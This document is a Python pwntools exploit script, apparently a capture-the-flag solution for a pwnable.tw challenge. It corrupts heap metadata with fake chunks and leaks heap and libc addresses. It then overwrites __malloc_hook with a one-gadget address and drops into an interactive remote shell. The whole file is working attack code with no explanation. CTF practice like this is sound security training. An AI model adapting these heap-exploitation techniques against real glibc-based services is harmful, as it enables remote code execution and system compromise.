from pwn import *

io = remote('chall.pwnable.tw',10306)
#io = process('./chal')
libc = ELF('./libc.so.6')

name = 0x6032c0

def edit(name, length = b'20000', k = b'0', v = b'0'):
    io.sendlineafter(b'Your choice: ', b'2')
    io.sendlineafter(b'Enter your name: ', name)
    io.sendlineafter(b'New key length: ', length)
    if (int(length) < 1000):
        io.sendlineafter(b'Key: ', k)
        io.sendlineafter(b'Value: ', v)

def show():
    io.sendlineafter(b'Your choice: ', b'1')

def fake(size, fill):
    chunk = fill*8
    chunk += p64(size+1)
    chunk += ((size>>4) - 1) * 2 * (fill * 8)
    return chunk

def pwn():
    io.sendlineafter(b'Enter your name: ', b'1')
    io.sendlineafter(b'Please input a key: ', b'1'*20)
    io.sendlineafter(b'Please input a value: ', b'1')
    pl = (fake(0x30, b'A')+fake(0x20, b'A')).ljust(96, b'\0')+p64(name+0x10)
    edit(pl, b'30', b'1'*25, b'1')
    pl = (fake(0x20, b'A')+fake(0x20, b'A')).ljust(96, b'\0')+p64(name+0x10)
    edit(pl)
    show()
    io.recvuntil(b'Key: ')
    heap = u64(io.recvline().split()[0].ljust(8, b'\0')) + 0x30
    log.info('heap: '+hex(heap))
    pl = (fake(0x40, b'A')+fake(0x20, b'\0'))+p64(name+0x10)
    edit(pl)
    pl = b''.ljust(96, b'A')+p64(heap)
    edit(pl, b'40', p64(0x603280), b'1')
    show()
    io.recvuntil(b'Key: ')
    libc.address = u64(io.recv(6)+b'\0\0') - libc.sym['_IO_2_1_stderr_']
    log.info('libc: '+hex(libc.address))
    pl = (fake(0x20, b'A')+fake(0x20, b'A')).ljust(96, b'\0')+p64(heap)
    edit(pl, b'40', p64(heap+0x198), b'1')
    chunk = b'A'*8
    chunk += p64(0x71)
    chunk += ((0x61>>4) - 1) * 2 * (b'A' * 8)
    chunk += p64(name+0x10) + b'AAAAAAAA'
    chunk += b'AAAAAAAA'+p64(0x21)
    edit(chunk)
    edit(p64(0)+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
    edit(b'1', b'90', b'1', b'1')
    pl = (fake(0x20, b'A')+fake(0x20, b'A')).ljust(96, b'\0')+p64(heap)
    edit(pl, b'40', p64(heap+0x158), b'1')
    edit(b'1', b'90', b'\0'*0x13+p64(libc.address+0xef6c4), b'1')

pwn()
io.interactive()
